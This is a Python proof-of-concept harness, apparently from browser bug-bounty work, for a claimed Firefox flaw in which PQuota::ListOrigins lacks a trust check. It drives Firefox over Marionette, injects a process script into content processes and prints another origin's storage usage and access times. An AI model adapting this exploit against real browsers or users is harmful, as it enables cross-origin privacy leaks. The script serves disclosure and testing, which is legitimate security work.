#!/usr/bin/env python3
"""
Runtime proof for finding 08: PQuota::ListOrigins has no TrustParams() gate.

Shows a CONTENT process for origin A enumerating origin B's stored origins.
READ-ONLY. Never calls clearStorage().

Origin A = http://127.0.0.1:PORT   (where the probe runs)
Origin B = http://127.0.0.2:PORT   (seeded with IndexedDB + localStorage)
Different hosts => different origins => different content processes under Fission.
"""
import http.server, json, os, socket, subprocess, sys, threading, time, shutil, signal

HERE   = os.path.dirname(os.path.abspath(__file__))
SP     = os.path.dirname(HERE)
FF_BIN = os.environ.get("FF_BIN", "/path/to/firefox-153.0.1/firefox")
PORT   = 9412
MPORT  = 2832
PROFILE = "/tmp/claude-1000/-home-sn0x-bb-CVE-FIREFOX-0day-exploitarium/97e1806a-cf56-4808-91ce-f83403b9e66c/scratchpad/q2/prof"

SEED = b"""<!doctype html><meta charset=utf-8><title>seed</title><script>
localStorage.setItem('snox','B');
const r = indexedDB.open('snoxdb',1);
r.onupgradeneeded = e => e.target.result.createObjectStore('s');
r.onsuccess = e => { document.title = 'SEEDED'; };
</script>seed page"""

PROBEPAGE = b"""<!doctype html><meta charset=utf-8><title>probe</title>
<script>localStorage.setItem('snox','A');</script>probe page"""


class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        body = SEED if self.path.startswith("/seed") else PROBEPAGE
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class Marionette:
    def __init__(self, host="127.0.0.1", port=MPORT, timeout=120):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout)
        self.buf = b""
        self.msgid = 0
        self._read()

    def _read(self):
        while b":" not in self.buf:
            c = self.sock.recv(65536)
            if not c:
                raise IOError("closed")
            self.buf += c
        ln, _, rest = self.buf.partition(b":")
        n = int(ln)
        while len(rest) < n:
            c = self.sock.recv(65536)
            if not c:
                raise IOError("closed")
            rest += c
        self.buf = rest[n:]
        return json.loads(rest[:n])

    def cmd(self, name, params=None):
        self.msgid += 1
        raw = json.dumps([0, self.msgid, name, params or {}]).encode()
        self.sock.sendall(str(len(raw)).encode() + b":" + raw)
        while True:
            m = self._read()
            if m[0] == 1 and m[1] == self.msgid:
                if m[2]:
                    raise RuntimeError(f"{name} -> {m[2]}")
                return m[3]


def main():
    if not os.path.exists(FF_BIN):
        sys.exit(f"set FF_BIN (env var or edit this file) - not found: {FF_BIN}")
    srv = http.server.ThreadingHTTPServer(("0.0.0.0", PORT), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"listener on 0.0.0.0:{PORT}")

    shutil.rmtree(PROFILE, ignore_errors=True)
    os.makedirs(PROFILE, exist_ok=True)
    with open(os.path.join(PROFILE, "user.js"), "w") as f:
        f.write(
            'user_pref("marionette.enabled", true);\n'
            'user_pref("marionette.port", 2832);\n'
            'user_pref("remote.active-protocols", 2);\n'
            'user_pref("browser.shell.checkDefaultBrowser", false);\n'
            'user_pref("fission.autostart", true);\n'
            'user_pref("dom.storage.next_gen", true);\n'
            'user_pref("datareporting.policy.dataSubmissionEnabled", false);\n'
        )
    proc = subprocess.Popen(
        [FF_BIN, "--marionette", "--no-remote", "-remote-allow-system-access",
         "--profile", PROFILE, f"http://127.0.0.2:{PORT}/seed"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,
    )
    try:
        for _ in range(60):
            try:
                m = Marionette(); break
            except OSError:
                time.sleep(1)
        else:
            raise SystemExit("marionette never came up")
        m.cmd("WebDriver:NewSession", {"capabilities": {}})

        # ---- seed origin B ----
        m.cmd("WebDriver:Navigate", {"url": f"http://127.0.0.2:{PORT}/seed"})
        time.sleep(3)
        print(f"seeded origin B = http://127.0.0.2:{PORT} (localStorage + IndexedDB)")

        # ---- keep B alive in this tab, open A in a SECOND tab ----
        m.cmd("WebDriver:NewWindow", {"type": "tab"})
        handles = m.cmd("WebDriver:GetWindowHandles")
        hs = handles["value"] if isinstance(handles, dict) else handles
        m.cmd("WebDriver:SwitchToWindow", {"handle": hs[-1]})
        m.cmd("WebDriver:Navigate", {"url": f"http://127.0.0.1:{PORT}/probe"})
        time.sleep(3)
        print(f"origin A live in tab 2 = http://127.0.0.1:{PORT} "
              f"(origin B still live in tab 1)")

        # ---- register actor + run probe IN THE CONTENT PROCESS ----
        m.cmd("Marionette:SetContext", {"value": "chrome"})
        m.cmd("WebDriver:SetTimeouts", {"script": 60000})
        import urllib.parse
        _js = open(os.path.join(HERE, "procscript.js")).read()
        ps = "data:application/javascript;charset=utf-8," + urllib.parse.quote(_js)
        script = """
          const ps   = arguments[0];
          const done = arguments[arguments.length - 1];
          const results = [];
          const listener = {
            receiveMessage(m) { results.push(m.data); },
          };
          try {
            Services.ppmm.addMessageListener("snox:q2", listener);
            Services.ppmm.loadProcessScript(ps, true);
          } catch (e) {
            done(JSON.stringify([{ harnessErr: String(e) }]));
            return;
          }
          setTimeout(() => {
            try { Services.ppmm.removeMessageListener("snox:q2", listener); } catch (e) {}
            try { Services.ppmm.removeDelayedProcessScript(ps); } catch (e) {}
            done(JSON.stringify(results));
          }, 25000);
        """
        raw = m.cmd("WebDriver:ExecuteAsyncScript",
                    {"script": script, "args": [ps], "sandbox": None})
        allres = json.loads(raw["value"] if isinstance(raw, dict) and "value" in raw else raw)
        b = f"http://127.0.0.2:{PORT}"

        print("\n" + "=" * 74)
        print(f"process scripts reported from {len(allres)} process(es)\n")
        import datetime
        content_hits = []
        for r in allres:
            tag = "PARENT " if r.get("isParent") else "CONTENT"
            print(f"  [{tag}] pid={r.get('pid')} processType={r.get('processType')} "
                  f"remoteType={r.get('remoteType')} phase={r.get('phase')}")
            if r.get("phase") == "done" and not r.get("isParent"):
                content_hits.append(r)
                if r.get("readErr"):
                    print(f"          readErr: {r['readErr']}")
                print(f"          resultCode={r.get('resultCode')} count={r.get('count')}")
                for row in (r.get("rows") or [])[:40]:
                    la = row.get("lastAccessed") or 0
                    try:
                        ts = datetime.datetime.fromtimestamp(la/1e6, datetime.timezone.utc).isoformat()
                    except Exception:
                        ts = str(la)
                    if 'origin' not in row:
                        print(f"            RAW {row}")
                        continue
                    print(f"            {row['origin']:<44} usage={row['usage']:<9} lastAccessed={ts}")
            if r.get("phase") == "threw":
                print(f"          threw: {r.get('err')}")
        print("=" * 74)
        ok = [c for c in content_hits if (c.get("count") or 0) > 0]
        if ok:
            print("CONFIRMED - a CONTENT process received per-origin usage metadata")
            print(f"  origins returned to content: {ok[0]['count']}")
            print("  fields: origin, usage(bytes), lastAccessed(us), persisted")
        else:
            print("NOT CONFIRMED - no content process got usage rows")
        print("=" * 74)
    finally:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except Exception:
            pass
        srv.shutdown()


if __name__ == "__main__":
    main()
